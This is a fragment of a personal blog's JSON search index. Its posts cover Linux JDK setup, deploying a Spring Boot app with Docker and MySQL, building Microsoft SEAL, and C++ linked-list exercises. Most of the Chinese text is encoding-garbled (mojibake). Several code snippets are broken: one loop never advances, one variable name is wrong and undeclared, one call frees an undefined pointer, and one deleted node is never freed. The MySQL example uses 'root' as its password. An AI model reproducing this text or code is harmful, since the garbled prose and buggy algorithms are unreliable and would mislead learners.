JAVA_HOME=/usr/java/jdk1.8.0_251-amd64 export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export PATH=$JAVA_HOME/bin:$PATH æ›´æ–°ç¯å¢ƒå˜é‡ source /etc/profile éªŒè¯: java -version","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Jdk","slug":"Jdk","permalink":"https://www.sizaif.com/tags/Jdk/"},{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"}],"author":"sizaif"},{"title":"ä½¿ç”¨Dockeréƒ¨ç½²SpringBooté¡¹ç›®å…¨æµç¨‹è®°å½•,è¶…è¯¦ç»†!","slug":"ä½¿ç”¨Dockeréƒ¨ç½²SpringBooté¡¹ç›®å…¨æµç¨‹è®°å½•-è¶…è¯¦ç»†","date":"2021-08-11T14:05:33.000Z","updated":"2021-09-19T10:14:19.194Z","comments":true,"path":"posts/dfba8e73/","link":"","permalink":"https://www.sizaif.com/posts/dfba8e73/","excerpt":"","text":"@auther by sizaif @TOC å¼•è¨€ æˆ‘çš„linuxç¯å¢ƒä¸º: centos:7 æœåŠ¡å™¨åœ¨å›½å¤–,æ‰€ä»¥æœ‰ä¸€äº›æ“ä½œåƒé˜¿é‡Œäº‘çš„ç«¯å£å®‰å…¨ç»„è®¾ç½®å°±ä¸éœ€è¦æ“ä½œ éœ€è¦çš„è½¯ä»¶ xshell(ç”¨æ¥è¿æ¥linuxæœåŠ¡å™¨) xftpæˆ–fileZillaç”¨æ¥ç»™linuxæœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ sqlyog(æˆ–è€…navicat)åœ¨æœåŠ¡å™¨ä¸Šè§£æ.sqlè„šæœ¬ maven(ideaè‡ªå¸¦) ç”¨æ¥æ‰“åŒ… å®‰è£…Docker å®˜ç½‘å¯¹ç³»ç»Ÿçš„è¦æ±‚ OS requirements To install Docker Engine, you need a maintained version of CentOS 7. Archived versions arenâ€™t supported or tested. The centos-extras repository must be enabled. This repository is enabled by default, but if you have disabled it, you need to re-enable it. The overlay2 storage driver is recommended. è¦æ±‚ç‰ˆæœ¬Centos7, å…¶ç‰ˆæœ¬ä¸æ”¯æŒæˆ–æœªæµ‹è¯• ç»è¿‡æˆ‘æµ‹è¯•,çš„ç¡®åœ¨å®‰è£…æ—¶ä¼šé‡åˆ°ä¾èµ–çš„é”™è¯¯æ‰€ä»¥å¹²è„†å°†Centos6 æ¢æˆCentos7 å®‰è£…å’Œè®¾ç½®ä»“åº“ å®˜æ–¹æ•™ç¨‹ sudo yum install -y yum-utils sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo è¿™ä¸ªä»“åº“æ˜¯å®˜æ–¹çš„,å¦‚æœå¤ªæ…¢çš„æ¢,æ¢æˆé˜¿é‡Œäº‘é•œåƒ: éœ€è¦é…ç½®æ–‡ä»¶ å¯ä»¥è‡ªè¡Œç™¾åº¦ sudo yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo å®‰è£…æœ€æ–°ç‰ˆçš„docker sudo yum install docker-ce docker-ce-cli containerd.io è‹¥è¦å®‰è£…ç‰¹å®šç‰ˆæœ¬ $ yum list docker-ce --showduplicates | sort -r docker-ce.x86_64 3:18.09.1-3.el7 docker-ce-stable docker-ce.x86_64 3:18.09.0-3.el7 docker-ce-stable docker-ce.x86_64 18.06.1.ce-3.el7 docker-ce-stable docker-ce.x86_64 18.06.0.ce-3.el7 docker-ce-stable ä¾‹å¦‚è¦æŒ‰ç…§ docker-ce.x86_64 18.06.1.ce-3.el7 &lt;VERSION_STRING&gt; docker-ce-18.06.1 sudo yum install docker-ce-&lt;VERSION_STRING> docker-ce-cli-&lt;VERSION_STRING> containerd.io å¼€å¯docker sudo systemctl start docker è·‘ä¸€ä¸ªdockerç‰ˆçš„helloworldï¼Œç±»ä¼¼äºjavaçš„helloï¼Œæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ sudo docker run hello-world å®‰è£…mysql ä»docker hubä¸ŠæŸ¥æ‰¾mysqlé•œåƒ docker search mysql ä»docker hubä¸Šæ‹‰å–mysql,æˆ‘æ‹‰å–çš„mysqlç‰ˆæœ¬æ˜¯mysql5.7 docker pull mysql:5.7 docker volume create mysql_data åˆ›å»ºæ•°æ®æŒ‚è½½ç‚¹ï¼ˆå³å­˜å‚¨æ•°æ®çš„åœ°æ–¹ï¼Œè¿™æ ·å³ä¾¿mysqlå®¹å™¨åˆ é™¤äº†ï¼Œæ•°æ®è¿˜æ˜¯åœ¨ï¼‰ docker volume create mysql_data è¿è¡Œmysqlï¼Œå¼€æ”¾çš„ç«¯å£æ˜¯3306ï¼Œå¯†ç æ˜¯rootï¼Œ -dæ˜¯åå°è¿è¡Œ docker run --name mysql -p 3306:3306 -v mysql_data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7 docker ps æŸ¥çœ‹å®¹å™¨åˆ›å»ºæˆåŠŸ è¿›å…¥mysql çš„å®¹å™¨å†… docker exec -it å®¹å™¨çš„id /bin/bash è¿›å…¥mysql, å½“å¯ä»¥è¿›å…¥æ—¶,è¯´æ˜mysql æ²¡é—®é¢˜äº†, é€šè¿‡docker restart é•œåƒå å¯ä»¥é‡å¯é•œåƒ docker restart mysql ä½¿ç”¨navicat è¿œç¨‹è¿æ¥æ•°æ®åº“ è¿è¡Œæœ¬åœ°çš„.sql æ–‡ä»¶, å°†è¿œç¨‹æ•°æ®åº“ä¸­å¢åŠ æ•°æ® å°†springbooté¡¹ç›®æ‰“æˆjaråŒ… æ³¨æ„å°†applicayion.ymlä¸­å¯†ç æ”¹æˆä½ æœåŠ¡å™¨ä¸Šmysqlçš„å¯†ç  æ‰“åŒ…ååœ¨targetä¸‹ä¼šç”Ÿæˆä¸€ä¸ªjaråŒ… ç¼–å†™Dockfileæ–‡ä»¶ åœ¨ /home ç›®å½•ä¸‹åˆ›å»ºdockeræ–‡ä»¶å¤¹ mkdir /home/docker ä½¿ç”¨xftpä¸Šä¼ jaråŒ… ç¼–å†™Dockerfileæ–‡ä»¶ vim Dockerfile å®Œæ•´å‘½ä»¤, vimçš„ä½¿ç”¨æ–¹æ³•ï¼šç‚¹å‡»iå¼€å§‹ç¼–å†™ï¼Œç¼–å†™å®Œåç‚¹å‡»escï¼Œç‚¹å‡»å†’å·ï¼Œè¾“å…¥wqä¿å­˜ FROM java:8ADD emsdemo-0.0.2-SNAPSHOT.jar /emsdemo.jarEXPOSE 8081ENTRYPOINT [\"java\",\"-jar\",\"/emsdemo.jar\"] #æ³¨æ„ï¼Œdockerå‘½ä»¤å…¨éƒ¨å¤§å†™ï¼Œè¿™æ˜¯è§„å®šã€‚ # From å…³é”®å­—è¡¨ç¤ºï¼ŒjaråŒ…ä¾èµ–çš„ç¯å¢ƒã€‚java:8 ç›¸å½“äºjdk1.8 FROM java:8 #ADDå‘½ä»¤ # emsdemo-0.0.2-SNAPSHOT.jarï¼šè¿™æ˜¯ä½ ä¸Šä¼ jaråŒ…çš„åç§°ã€‚ # /emsdemo.jarï¼šè¿™æ˜¯è‡ªå®šä¹‰çš„åç§°ã€‚ä½†æ˜¯æ³¨æ„è¦æœ‰ä¹‹å‰çš„/ ADD emsdemo-0.0.2-SNAPSHOT.jar /emsdemo.jar #MAINTAINER ä½œè€…åç§°ã€‚å¯ä»¥åˆ é™¤ä¸å†™ã€‚ MAINTAINER Sizaif #EXPOSE é¡¹ç›®æš´éœ²çš„ç«¯å£å· EXPOSE 8080 #/blog.jaræ­¤å¤„çš„åç§°è¦å’ŒADDå‘½ä»¤åé¢çš„ä¸€æ ·ã€‚ ENTRYPOINT [\"java\",\"-jar\",\"/emsdemo.jar\"] åœ¨dockeræ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ docker build -t emsdemo:1.0 . è¿è¡Œé•œåƒ docker run -it --net=host --name emsdemo -d -p 80:8081 emsdemo:1.0 è‡³æ­¤å…¨éƒ¨å®Œæˆ. åœ¨æµè§ˆå™¨è®¿é—®å°±å¯ä»¥äº†","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Springboot","slug":"æŠ€æœ¯å‘/Springboot","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Springboot/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"},{"name":"Springboot","slug":"Springboot","permalink":"https://www.sizaif.com/tags/Springboot/"}],"author":"sizaif"},{"title":"åœ¨windowsä¸Šå®‰è£…Microsoft SEAL","slug":"åœ¨windowsä¸Šå®‰è£…Microsoft-SEAL","date":"2021-08-11T14:04:10.000Z","updated":"2021-09-19T10:13:59.342Z","comments":true,"path":"posts/6b27b8ff/","link":"","permalink":"https://www.sizaif.com/posts/6b27b8ff/","excerpt":"","text":"@auther by sizaif åœ¨windowsä¸Šå®‰è£…Microsoft SEAL Noteï¼è¯´æ˜ å®‰è£…çš„ç‰ˆæœ¬ä¸º3.6 éœ€è¦ç¯å¢ƒ Visual Studio 2019 with C++ CMake Tools for Windows 1. git é¡¹ç›®æ–‡ä»¶ git clone https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;SEAL.git 2. ä»¥ç®¡ç†å‘˜æ‰“å¼€VS2019æ‰“å¼€SEALæ–‡ä»¶å¤¹ æ‰“å¼€åï¼ŒVSä¼šè‡ªåŠ¨è¿è¡Œcmakeé…ç½® Visual Studio will detect that this is a CMake-based project and will enable the menu command Project / CMake settings for SEAL. This will open the CMake settings editor that provides a user interface where you can create different configurations and set different CMake options. 3. VSé‡Œæ‰“å¼€ç»ˆç«¯powershell å› ä¸ºVS2019æ˜¯ä»¥ç®¡ç†å‘˜æ‰“å¼€çš„ï¼Œæ‰€ä»¥æ‰“å¼€çš„ç»ˆç«¯ä¹Ÿæ˜¯å¸¦æœ‰ç®¡ç†å‘˜æƒé™çš„ 4. åœ¨ç»ˆç«¯ä¸­ä¾æ¬¡è¾“å…¥ cmake -S . -B build cmake --build build cmake --install build æˆ–è€…é‡‡ç”¨ #Generate and build for x64 in Release mode cmake -S . -B build -G &quot;Visual Studio 16 2019&quot; -A x64 cmake --build build --config Release cmake --install build å¦‚æœæˆåŠŸï¼Œåˆ™é»˜è®¤å®‰è£…çš„C:/Program Files(x86)/SEAL/ç›®å½•ä¸‹ æˆ–è€…ç›´æ¥æ‰“å¼€ x64 Native Tools è¿›å…¥åˆ°ä½ çš„ä»githubä¸Šä¸‹è½½çš„SEALæ–‡ä»¶å¤¹ä½ç½® ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ cmake -S . -B build -G Ninja cmake --build build cmake --install build å¦‚æœä¸å‡ºé—®é¢˜å‡ºç°ä¸‹é¢å›¾ç‰‡,åˆ™å®‰è£…å®Œæˆ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"},{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/tags/Win/"}],"author":"sizaif"},{"title":"çº¿æ€§è¡¨(é“¾è¡¨)é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†(é™„ä»£ç )","slug":"çº¿æ€§è¡¨-é“¾è¡¨-é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†-é™„ä»£ç ","date":"2021-08-11T14:01:59.000Z","updated":"2021-09-19T10:14:15.029Z","comments":true,"path":"posts/41ebddd6/","link":"","permalink":"https://www.sizaif.com/posts/41ebddd6/","excerpt":"","text":"@auther by sizaif è¯´æ˜ï¼š éƒ¨åˆ†é¢˜ç›®ä¸ºç‹é“é¢˜ç›®æ•´ç†ï¼Œ(ps.ç‹é“ä¸Šæ€è·¯æ²¡é—®é¢˜ï¼Œåœ¨å®ç°ä»£ç ä¸Šç•¥æœ‰äº›é—®é¢˜) å› ä¸ªäººä»£ç é£æ ¼ä¸ç‹é“ç•¥æœ‰ä¸åŒï¼Œéƒ¨åˆ†ç»†èŠ‚ä»£ç ä¹Ÿä¸å°½ç›¸åŒ ä¸ªäººæ•´ç†by sizaif @TOC é“¾è¡¨ï¼š //å•é“¾è¡¨ç»“æ„ typedef struct link&#123; int data; link *next; &#125;node,*linklist; 1) è¾“å…¥ä¸€ç»„æ•´å‹å…ƒç´ åºåˆ—ï¼Œä½¿ç”¨å°¾æ’æ³•(å¤´æ’æ³•)å»ºç«‹ä¸€ä¸ªå¸¦æœ‰å¤´ç»“ç‚¹(ä¸å¸¦å¤´ç»“ç‚¹)çš„å•é“¾è¡¨ã€‚ code /** * å»ºç«‹å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ * @param L [description] */ void Creat_list_Head(linklist &amp;L) &#123; L = new node(); linklist p,s=L; L->next=NULL; int x; /*while(cin>>x,x>0)// å¤´æ’ &#123; p= new node(); p->data =x; p->next=L->next; L->next=p; &#125;*/ while(cin>>x,x>0)//å°¾æ’ &#123; p=new node(); p->data=x; s->next=p; s=p; &#125; &#125; void Creat_list_withoutHead(linklist &amp;L)&#123; L = NULL; linklist p,s; int x; /* while(cin>>x,x>0)// å¤´æ’ &#123; p= new node(); p->data =x; p->next=L; L=p; &#125; */ while(cin>>x,x>0)&#123; // å°¾æ’ p = new node(); p->data = x; p->next = NULL; if(L==NULL) L = p; // ç¬¬ä¸€ä¸ªç»“ç‚¹ else&#123; s = L; while(s->next)&#123; // éå†åˆ°æœ€åä¸€ä¸ªç»“ç‚¹ s = s->next; &#125; s->next = p; &#125; &#125; &#125; 2) åœ¨è¯¥å•é“¾è¡¨çš„ç¬¬iä¸ªå…ƒç´ å‰æ’å…¥ä¸€ä¸ªæ•´æ•°ã€‚(ä»0å¼€å§‹) code ++/** * åœ¨ å•é“¾è¡¨ ç¬¬xä¸ªä½ç½® å‰æ’å…¥y * @param L [description] * @param x [description] * @param y [description] * @return [description] */ void Add_before_X(linklist &amp;L,int x,int y) &#123; linklist p,s; p=L->next; int j=0; while(p&amp;&amp;j&lt;x-1) &#123; p=p->next;j++; &#125; if(!p||j>x-1)&#123;cout&lt;&lt;\"error\"&lt;&lt;endl;return;&#125; s=new node(); s->data=y; s->next=p->next; p->next=s; &#125; 3) åˆ é™¤è¯¥å•é“¾è¡¨ä¸­çš„ç¬¬iä¸ªå…ƒç´ ï¼Œå…¶å€¼é€šè¿‡å‚æ•°å°†å…¶è¿”å›(ä»0å¼€å§‹)ã€‚ code ++/** * åˆ é™¤å•é“¾è¡¨ä¸­ç¬¬iä¸ªå…ƒç´  çš„ç»“ç‚¹ * @param L [description] * @param i [description] */ void Delet_x(linklist &amp;L,int &amp;i) &#123; linklist s,p; p=L->next; int j=0; while(p&amp;&amp;j&lt;i-1) &#123; p=p->next; j++; &#125; i = p->data; s = p->next; p->next=s->next; &#125; 4) å»ºç«‹ä¸¤ä¸ªæŒ‰å€¼é€’å¢æœ‰åºçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œå°†ä»–ä»¬åˆå¹¶æˆä¸€ä¸ªæŒ‰å€¼é€’å‡æœ‰åºçš„å•é“¾è¡¨ã€‚ code ++/** * æ€è·¯ï¼š å½’å¹¶ï¼Œ å¤´æ’æ³• */ linklist Union(linklist la,linklist lb)&#123; linklist p,q,r,rear,t; p = la->next,q = lb->next; la->next = NULL; r = la; // ré‡æ„la while( p &amp;&amp; q)&#123; if( p->data &lt; q->data)&#123; rear = p->next; p->next = r->next; r->next = p; p = rear; &#125;else if( p->data > q->data)&#123; rear = q->next; q->next = r->next; r->next = q; q = rear; &#125; else &#123; // å½“ä¸¤ä¸ªå€¼ç›¸åŒæ—¶,(æŒ‰é¢˜ç›®è¦æ±‚ä¸¤ä¸ªéƒ½ä¿ç•™, å¦å¤–ä¸€ä¸ªfreeæ‰) rear = q->next; t = p ->next; p->next = r->next; r->next = p; q->next = r->next; r->next = q; // free(q); q = rear; p = t; &#125; &#125; while(p)&#123; // å› ä¸ºæ˜¯å€’å™, æ‰€ä»¥å¿…é¡» é€æ­¥éå†å¤´æ’å‰©ä½™éƒ¨åˆ† rear = p->next; p->next = r->next; r->next = p; p = rear; &#125; while(q)&#123; rear = q->next; q->next = r->next; r->next = q; q = rear; &#125; return la; &#125; plus-ä¸¤ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨A B åˆå¹¶æˆä¸€ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨C code ++/** * ä¸¤ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨A B åˆå¹¶æˆä¸€ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨C * @param L [description] * @param B [description] */ void Merage_A_B(linklist &amp;A,linklist &amp;B,linklist &amp;C) &#123; linklist pa,pb,pc; pa = A->next; pb = B->next; pc = new node(); pc ->next =NULL; while(pa&amp;&amp;pb) &#123; if(pa->data &lt;= pb->data)&#123; pc->next = pa; pc = pa; pa = pa->next; &#125;else&#123; pc ->next = pb; pc = pb; pb = pb->next; &#125; &#125; // å°¾æ’ pc ->next = pa? pa:pb; &#125; 5) è¯•ç¼–å†™ç®—æ³•å°†å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨å°±åœ°é€†ç½®ï¼Œæ‰€è°“â€œå°±åœ°â€æ˜¯æŒ‡è¾…åŠ©ç©ºé—´å¤æ‚åº¦ä¸ºO(1)ã€‚ (è®¡.æœŸæœ«.10.1) å¤´æ’é‡æ–°å»ºè¡¨ æŒ‡é’ˆåè½¬ é¡ºåºå­˜å‚¨ æ•°ç»„ code ++//æ³•ä¸€ï¼šå¤´æ’æ³•ä»æ–°å»ºè¡¨ void reverse(linklist &amp;L)&#123; linklist p,rear; // rear ä¸ºpçš„åç»§ é˜²æ­¢æ–­é“¾ p = L->next; L->next = NULL; // å¤´ç»“ç‚¹çš„Next ç½®ä¸ºnull while(p)&#123; rear = p->next; // å¤´æ’æ³• p->next = L->next; L->next = p; p = rear; &#125; &#125; //æ³•äºŒï¼šæŒ‡é’ˆåè½¬ void reverse(linklist &amp;L)&#123; LinkList temp,p,q; temp = NULL; p = L->next; q = L->next->next; while(q!=NULL)&#123; temp = q->next; // æš‚å­˜q-Next q->next = p; // æŒ‡é’ˆé€†ç½® p = q; // å¾€åç§» q = temp; &#125; L->next->next=NULL; // ç¬¬ä¸€ä¸ªç»“ç‚¹å˜æˆæœ€åä¸€ä¸ªç»“ç‚¹ L->next = p; // æœ€åä¸€ä¸ªç»“ç‚¹å˜æˆç¬¬ä¸€ä¸ªç»“ç‚¹ &#125; //æ³•ä¸‰ï¼š é¡ºåºå­˜å‚¨ æ•°ç»„ void reverse(int A[],int n)&#123; for(int i = 0 ; i &lt; n/2 ; i++)&#123; temp = A[i]; A[i] = A[n-i-1]; A[n-i-1] = temp; &#125; &#125; 6) å°†ä¸€ä¸ªå¤´æŒ‡é’ˆä¸ºheadä¸”ä¸å¸¦å¤´èŠ‚ç‚¹çš„å•é“¾è¡¨æ”¹é€ ä¸ºä¸€ä¸ªå«å¤´èŠ‚ç‚¹ä¸”å¤´æŒ‡é’ˆä¸ºheadçš„å•å¾ªç¯é“¾è¡¨ (è®¡.æœŸæœ«.09.1) code ++//æ²¡æœ‰å•å¾ªç¯-> head->next = head; æ”¹é€ ä¸ºå¸¦å¤´ç»“ç‚¹çš„ void fun(LinkList &amp;head)&#123; LinkList p; p = new LinkNode(); if(head == NULL)&#123; head = p; p->next = p; // å•å¾ªç¯ &#125;else&#123; p->next = head; // åˆ›é€ å¤´ç»“ç‚¹ // å•å¾ªç¯åˆ—è¡¨ Linklist t = head; while(t->next != NULL)&#123; t = t->next; &#125; t->next = p; // æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡å‘å¤´ç»“ç‚¹ head = p; // å°†p èµ‹ç»™ head å˜æˆheadé“¾è¡¨ &#125; &#125; 7) å‡è®¾æœ‰ä¸¤ä¸ªæŒ‰å…ƒç´ å€¼é€’å¢æ¬¡åºæ’åˆ—çš„çº¿æ€§è¡¨ï¼Œå‡ä¸å¸¦å¤´ç»“ç‚¹ä»¥å•é“¾è¡¨å½¢å¼å­˜å‚¨ã€‚è¯·ç¼–å†™ç®—æ³•å°†è¿™ä¸¤ä¸ªå•é“¾è¡¨å½’å¹¶ä¸ºä¸€ä¸ªæŒ‰å…ƒç´ å€¼é€’å‡(éé€’å‡)æ¬¡åºæ’åˆ—çš„å•é“¾è¡¨ï¼Œå¹¶è¦æ±‚åˆ©ç”¨åŸæ¥ä¸¤ä¸ªå•é“¾è¡¨çš„ç»“ç‚¹å­˜æ”¾å½’å¹¶åçš„å•é“¾è¡¨ (è®¡.æœŸæœ«.08.2) !!! code ++linklist merge_without_Head(linklist la,linklist lb)&#123; linklist lc = NULL,lce = NULL; while(la &amp;&amp; lb) &#123; if( la->data &lt;= lb->data)&#123; if(!lc) lc = la; else &#123; lce->next = la; &#125; lce = la; la = la->next; &#125;else&#123; if(!lc) lc = lb; else &#123; lce->next = lb; &#125; lce = lb; lb = lb->next; &#125; &#125; if(lc)&#123; if(la) lce ->next = la; else lce ->next = lb; &#125;else &#123; if(la ) lc = la; else lc = lb; &#125; return lc; &#125; 8) ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aåˆ†è§£ä¸ºä¸¤ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aå’ŒBï¼Œä½¿å¾—Aè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¥‡æ•°çš„å…ƒç´ ï¼Œè€ŒBè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¶æ•°çš„å…ƒç´ ï¼Œä¸”ä¿æŒå…¶ç›¸å¯¹é¡ºåºä¸å˜ code ++void div(linklist &amp;A,linklist &amp;B)&#123; linklist p,pc,pb,temp,Lc; p = A->next; Lc = new node(); Lc->next = NULL; pc = Lc; pb = B; int i = 1; while(p)&#123; temp = p->next; // ä¿å­˜åç»§é˜²æ­¢æ–­é“¾ if(i%2==1)&#123; //å°¾æ’ p->next = pc->next; pc->next = p; pc = p; &#125;else &#123; //å°¾æ’ p->next = pb->next; pb->next = p; pb = p; &#125; p = temp; i++; &#125; A = LC; &#125; 9) è®¾è®¡ä¸€ä¸ªé€’å½’ç®—æ³•ï¼Œåˆ é™¤ä¸å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹(ç»Ÿè®¡å€¼ç­‰äºxçš„æ•°ç›®) int CountX(Lnode * HL, ElemType x) code ++void del(LinkList &amp;L,ElemType x)&#123; LinkList temp; // åšé‡Šæ”¾ç”¨ if(L==NULL) return; // ç»“æŸæ¡ä»¶ if(L->data == x)&#123; temp = L; L = L ->next; free(t); del(L,x); &#125;else&#123; del(L->next,x); &#125; &#125; // é€’å½’ç»Ÿè®¡ int ct = 0; void count(LinkList &amp;L,ElemType x)&#123; if(L == NULL) return; if(L->data == x) ct++; count(L->next,x); &#125; 10) åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­ï¼Œåˆ é™¤æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹ï¼Œå¹¶é‡Šæ”¾ç©ºé—´ï¼Œå‡è®¾å€¼ä¸ºxçš„ç»“ç‚¹ä¸å”¯ä¸€ï¼Œè¯•ç¼–å†™ç®—æ³•ä»¥å®ç°ä¸Šè¿°æ“ä½œã€‚ code ++void del_x(linklist &amp;L,int x)&#123; linklist p,temp,pre; p = L->next,pre = L; // pre é˜²æ­¢æ–­é“¾ while(p)&#123; if(p->data == x)&#123; temp = p; p = p->next; pre ->next = p; free(temp); &#125;else&#123; // åŒæ—¶åç§» pre = p; p = p->next; &#125; &#125; &#125; 11) è®¾Lä¸ºå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œç¼–å†™ç®—æ³•å®ç°ä»å°¾åˆ°å¤´åå‘è¾“å‡ºæ¯ä¸ªç»“ç‚¹çš„å€¼(å¤´æ’æ³•å»ºè¡¨ï¼Œéå†) code ++//æ³•ä¸€ï¼š ä¸€è¾¹éå†ä¸€è¾¹å¤´æ’æ³•å»ºç«‹æ–°è¡¨ linklist create_head(linklist &amp;L)&#123; liklist newL,p,q; newL = new node(); newL->next = NULL; p = L->next; while(p)&#123; q = new node(); q->data = p->data; q->next = newL->next; newL->next = q; &#125; return newL; &#125; void Visit(linklist L) &#123; linklist p; p=L->next; while(p) &#123; printf(\"%d \",p->data); p=p->next; &#125; cout&lt;&lt;endl; &#125; æ³•äºŒï¼š // é‡‡ç”¨é€’å½’è¾“å‡º æ ˆçš„æ€æƒ³ void R_p(linklist L)&#123; if(L->next != NULL)&#123; R_p(L->next); &#125; cout&lt;&lt;L->data&lt;&lt;\" \"; &#125; 12) è¯•ç¼–å†™åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­åˆ é™¤ä¸€ä¸ªæœ€å°å€¼ç»“ç‚¹çš„é«˜æ•ˆç®—æ³•ï¼ˆå‡è®¾æœ€å°å€¼ç»“ç‚¹æ—¶å”¯ä¸€çš„ï¼‰ code ++void delete_MinX(linklist &amp;L)&#123; linklist pre,p,minp,minpre; pre = L; p = L->next;// pre æŒ‡å‘å‰é©± minp = p,minpre = pre; while(p)&#123; // éå†å¯»æ‰¾æœ€å°å€¼ if(p->data &lt;= minp->data)&#123; minp = p; minpre = pre; &#125; pre = p; p = p ->next; &#125; // åˆ é™¤minp ç»“ç‚¹ minpre->next = minp->next; free(minp); &#125; 13) æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä½¿å…¶å…ƒç´ é€’å¢æœ‰åº code ++// ç©ºé—´æ¢æ—¶é—´O(n^2) è€ƒçš„æ¦‚ç‡ä¸å¤§ void sort(linklist &amp;L)&#123; linklist p,pre,rear; p = L->next; rear = p->next; // rear ä¿ç•™påé¢çš„é“¾è¡¨ä¿è¯ä¸æ–­é“¾ p->next = NULL; // è®© L åªæœ‰ä¸€ä¸ªç»“ç‚¹ï¼Œ é‡æ„ L p = rear; // éå†å‰©ä¸‹çš„å†…å®¹é“¾è¡¨ while(p)&#123; rear = p->next; pre = L; while(pre->next!= NULL &amp;&amp; pre->next->data &lt; p->data)&#123; // åœ¨æ–°Lä¸­æ‰¾åˆ°p->dataåº”è¯¥çš„ä½ç½® pre = pre->next; &#125; p->next = pre->next; // å°¾æ’æ³• æŠŠ p æ’å…¥åˆ°æ–°L ä¸­ pre -> next = p;// å°¾æ’æ³• æŠŠ p æ’å…¥åˆ° æ–°L ä¸­ p = rear; // ç»§ç»­éå† æ—§L å‰©ä¸‹çš„å†…å®¹ &#125; &#125; 14) è®¾åœ¨ä¸€ä¸ªå¸¦è¡¨ç»“ç‚¹çš„å•é“¾è¡¨ä¸­æ‰€æœ‰å…ƒç´ ç»“ç‚¹çš„æ•°æ®å€¼æ— åºï¼Œè¯•ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œåˆ é™¤è¡¨ä¸­æ‰€æœ‰ä»‹äºç»™å®šçš„ä¸¤ä¸ªå€¼ï¼ˆä½œä¸ºå‡½æ•°å‚æ•°ç»™å‡ºï¼‰ä¹‹é—´çš„å…ƒç´ çš„å…ƒç´ ï¼ˆè‹¥å­˜åœ¨ï¼‰ æ•°å­—ä¹‹é—´ï¼Œå­—æ¯ä¹‹é—´ç­‰é—®é¢˜ code ++void delete_between(linklist &amp;L,ElemType x,ElemType y)&#123; linklist p,pre,temp; p = L->next; pre = L; while(p)&#123; if(p->data >= x &amp;&amp; p->data &lt;= y)&#123; // å¦‚æœä»‹äºä¹‹é—´ // åˆ é™¤ pre->next = p->next; free(p); p = pre->next; &#125;else&#123; // å¦åˆ™ç»§ç»­éå† pre = p; p = p->next; &#125; &#125; &#125; ## 15) **ç»™å®šä¸¤ä¸ªå•é“¾è¡¨ï¼Œç¼–å†™ç®—æ³•æ‰¾å‡ºä¸¤ä¸ªé“¾è¡¨çš„å…¬å…±ç»“ç‚¹ã€‚** 